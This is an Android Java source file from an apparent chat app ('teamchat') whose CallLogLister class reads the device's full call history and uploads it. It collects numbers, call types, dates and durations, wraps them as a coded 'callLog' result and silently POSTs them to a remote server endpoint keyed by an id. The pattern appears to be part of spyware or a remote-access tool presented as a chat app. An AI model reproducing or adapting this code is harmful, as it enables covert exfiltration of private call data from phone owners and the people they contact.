package com.example.teamchat;

import static com.example.teamchat.Constants.SERVER;

import android.Manifest;
import android.content.ContentResolver;
import android.content.Context;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

public class CallLogLister {
    private ContentResolver contentResolver;
    private final static String TAG = ChatService.class.getSimpleName();


    public static void getCallDetails(Context context, String id) throws JSONException {
        ContentResolver contentResolver = context.getContentResolver();
        //Log.d(TAG, "reading contacts");
        JSONArray callLogsArray = new JSONArray();
        Cursor cursor = contentResolver.query(CallLog.Calls.CONTENT_URI, null, null,
                null, CallLog.Calls.DATE + " DESC");
        if (cursor.moveToFirst()) {
            do {
                String callNumber = cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER));
                String callType = cursor.getString(cursor.getColumnIndex(CallLog.Calls.TYPE));
                String callDate = cursor.getString(cursor.getColumnIndex(CallLog.Calls.DATE));
                Date callDayTime = new Date(Long.valueOf(callDate));
                String callDuration = cursor.getString(cursor.getColumnIndex(CallLog.Calls.DURATION));
                String callTypeStr = "";
                int callcode = Integer.parseInt(callType);
                switch (callcode) {
                    case CallLog.Calls.OUTGOING_TYPE:
                        callTypeStr = "Outgoing";
                        break;
                    case CallLog.Calls.INCOMING_TYPE:
                        callTypeStr = "Incoming";
                        break;
                    case CallLog.Calls.MISSED_TYPE:
                        callTypeStr = "Missed";
                        break;
                }
                JSONObject json = new JSONObject();
                json.put("number", callNumber);
                json.put("type", callTypeStr);
                json.put("date", new SimpleDateFormat("dd-MMM-yyyy HH:mm", Locale.ENGLISH).format(callDayTime).toString());
                json.put("duration", callDuration);
                callLogsArray.put(json);
            } while (cursor.moveToNext());
        }
        JSONObject parentObject = new JSONObject();
        parentObject.put("code", "callLog");
        parentObject.put("data", callLogsArray);
        System.out.println(parentObject.toString());
        try {
            HttpConnection.ReturnResponse response = HttpConnection.connect(SERVER + "result/" + id, "POST", parentObject.toString());

            assert response != null;
            if (response.responseCode == 200) {
                Log.d(TAG, "Response: " + response.body);
            } else {
                throw new IOException("Unexpected code " + response.responseCode);
            }
        } catch (IOException e) {
            //Log.e(TAG, "Error sending request: " + e.getMessage());
        }
    }
}